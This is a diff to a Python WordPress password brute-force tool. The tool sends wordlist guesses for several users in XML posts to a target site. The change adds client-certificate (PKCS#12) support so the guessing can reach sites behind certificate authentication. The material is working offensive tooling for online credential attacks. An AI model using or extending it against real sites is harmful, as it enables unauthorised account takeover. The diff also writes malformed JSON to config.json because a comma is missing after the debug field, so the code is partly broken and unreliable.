@@ -5,6 +5,7 @@ import json
 import datetime
 
 from requests import post
+from requests_pkcs12 import post as post_pkcs12
 
 print("\nWP Multi-User Bruteforce by entr0pie / See https://github.com/entr0pie/wp-multi-bruteforce for more information.")
 
@@ -18,6 +19,8 @@ parser.add_argument("-t", "--target", type=str, required=False, help="Target WP 
 parser.add_argument("-u", "--users", type=str, required=False, help="Set users for the multicall | example: -u andrew,peter,kate")
 parser.add_argument("-w", "--word", type=str, required=False, help="Set an start word from the wordlist | example: -w password")
 parser.add_argument("-W", "--wordlist", type=str, required=False, help="Set an wordlist | example: -W /usr/share/wordlists/rockyou.txt")
+parser.add_argument("--client-cert-p12", type=str, required=False, help="Set an client certificate | example: --client-cert-p12 /path/to/cert.p12")
+parser.add_argument("--client-cert-p12-password", type=str, required=False, help="Set an client certificate password | example: --client-cert-p12-password password")
 parser.add_argument("--debug", action="store_true", help="Active debug mode")
 
 args = parser.parse_args()
@@ -32,6 +35,8 @@ if args.config:
     WORDLIST = content['wordlist']
     WORD = content['word']
     DEBUG = bool(content['debug'])
+    CLIENT_CERT_P12 = content['client-cert-p12']
+    CLIENT_CERT_P12_PASSWORD = content['client-cert-p12-password']
 
 else:
     
@@ -57,6 +62,14 @@ else:
 
     DEBUG = bool(args.debug)
 
+    if args.client_cert_p12:
+        CLIENT_CERT_P12 = args.client_cert_p12
+        print(f"* Using {args.client_cert_p12} as client certificate")
+        CLIENT_CERT_P12_PASSWORD = args.client_cert_p12_password
+    else:
+        CLIENT_CERT_P12 = None
+        CLIENT_CERT_P12_PASSWORD = None
+
     print("* Generating config.json ...")
     file = open('config.json', 'w')
     content =  "{\n"
@@ -65,6 +78,8 @@ else:
     content += f"    \"wordlist\":\"{WORDLIST}\",\n"
     content += f"    \"word\":\"{WORD}\",\n"
     content += f"    \"debug\":\"{DEBUG}\"\n"
+    content += f"    \"client-cert-p12\":\"{CLIENT_CERT_P12}\",\n"
+    content += f"    \"client-cert-p12-password\":\"{CLIENT_CERT_P12_PASSWORD}\"\n"
     content += "}\n"
 
     file.write(content)
@@ -157,7 +172,10 @@ for passwd in passwords:
     xml = xml_file.read()
     xml = xml.replace("PASSWORD", passwd)
         
-    response = post(HOST, data=xml)
+    if CLIENT_CERT_P12:
+        response = post_pkcs12(HOST, data=xml, pkcs12_filename=CLIENT_CERT_P12, pkcs12_password=CLIENT_CERT_P12_PASSWORD)
+    else:
+        response = post(HOST, data=xml)
     
     content = response.text
     
